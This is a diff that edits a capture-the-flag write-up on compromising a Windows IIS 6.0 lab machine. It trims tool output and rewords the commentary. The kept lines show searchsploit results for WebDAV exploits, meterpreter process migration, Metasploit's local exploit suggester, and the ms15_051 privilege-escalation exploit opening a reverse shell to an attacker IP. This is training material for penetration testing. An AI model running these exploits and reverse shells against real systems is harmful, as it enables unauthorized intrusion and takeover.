@@ -56,25 +56,15 @@ Seems like there’s nothing much.. but luckily the `nmap` scan showed the versi
 ```bash
 ┌──(root💀Shiro)-[/home/shiro]
 └─# searchsploit iis 6.0
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                     |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                   | windows/remote/21057.txt
-Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                            | windows/remote/9541.pl
-Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                              | windows/dos/9587.txt
-Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                       | windows/dos/3965.pl
-Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                             | windows/dos/15167.txt
+...
 Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                           | windows/remote/41738.py
 Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                            | windows/remote/8765.php
 Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                        | windows/remote/8704.txt
 Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                        | windows/remote/8806.pl
 Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                    | windows/remote/8754.patch
-Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                           | windows/remote/19033.txt
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-Papers: No Results
+...
 ```
-Out of all the possible exploits, the `WebDAV` exploit seems to be the most interesting/effective OwO
+Out of all the possible exploits, the `WebDAV` exploit seems to be the most relevant.
 
 # Exploitation
 
@@ -121,11 +111,9 @@ C:\Documents and Settings>dir
 C:\Documents and Settings>cd Harry
 Access is denied.
 ```
-It seems like the shell spawned can’t even get the user flag… :(
-
 # Privilege Escalation
 
-Let’s use the exploit suggester module to get a better shell. However, before that, we need to migrate to a more stable and NT Authority running process. 
+It seems like we do not have enough rights to access `Harry`’s directory. We can try migrating to a NT Authority running process instead. 
 
 ```bash
 C:\Documents and Settings>exit
@@ -139,36 +127,12 @@ Process List
  0     0     [System Process]
  4     0     System
  212   1080  cidaemon.exe
- 272   4     smss.exe
- 316   1080  cidaemon.exe
- 324   272   csrss.exe
- 348   272   winlogon.exe
- 396   348   services.exe
- 408   348   lsass.exe
- 412   1080  cidaemon.exe
- 612   396   svchost.exe
- 684   396   svchost.exe
- 740   396   svchost.exe
- 768   396   svchost.exe
- 804   396   svchost.exe
- 940   396   spoolsv.exe
- 968   396   msdtc.exe
- 1080  396   cisvc.exe
- 1124  396   svchost.exe
- 1184  396   inetinfo.exe
- 1224  396   svchost.exe
- 1324  396   VGAuthService.exe
- 1412  396   vmtoolsd.exe
- 1460  396   svchost.exe
- 1600  396   svchost.exe
- 1712  396   alg.exe
+...
  1816  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
  1916  396   dllhost.exe
  2220  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
  2288  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
- 2432  612   wmiprvse.exe
- 2468  348   logon.scr
- 2796  2220  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+...
 
 meterpreter > migrate 1816
 [*] Migrating from 2796 to 1816...
@@ -188,14 +152,12 @@ C:\WINDOWS\system32>cd c:\Documents and Settings
 C:\Documents and Settings>cd Harry
 Access is denied.
 ```
-Now that we have migrated the process to a NT Authority process, let’s run the exploit suggester! 
+It seems like we still do not have enough rights to access `Harry`’s directory. We can use Metasploit’s `local_exploit_suggester` to look for possible exploit vectors.
 
 ```bash
 C:\Documents and Settings>exit
 meterpreter > run post/multi/recon/local_exploit_suggester 
-
-[*] 10.10.10.14 - Collecting local exploits for x86/windows...
-[*] 10.10.10.14 - 37 exploit checks are being tried...
+...
 [+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
 [+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
 [+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
@@ -204,7 +166,7 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 [+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
 [+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 ```
-It seems like there are a few exploits! Let’s randomly choose one of them and check if we can grab the user and root flag.
+There are a few exploits! Let’s use the `ms15_051_client_copy_image` exploit.
 
 ```bash
 meterpreter > background
@@ -216,15 +178,7 @@ LHOST => 10.10.14.4
 msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
 session => 1
 msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit
-
-[*] Started reverse TCP handler on 10.10.14.4:4444 
-[*] Launching notepad to host the exploit...
-[+] Process 1260 launched.
-[*] Reflectively injecting the exploit DLL into 1260...
-[*] Injecting exploit into 1260...
-[*] Exploit injected. Injecting payload into 1260...
-[*] Payload injected. Executing exploit...
-[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+...
 [*] Sending stage (175174 bytes) to 10.10.10.14
 [*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.10.10.14:1032) at 2021-05-23 15:33:10 +0800
 
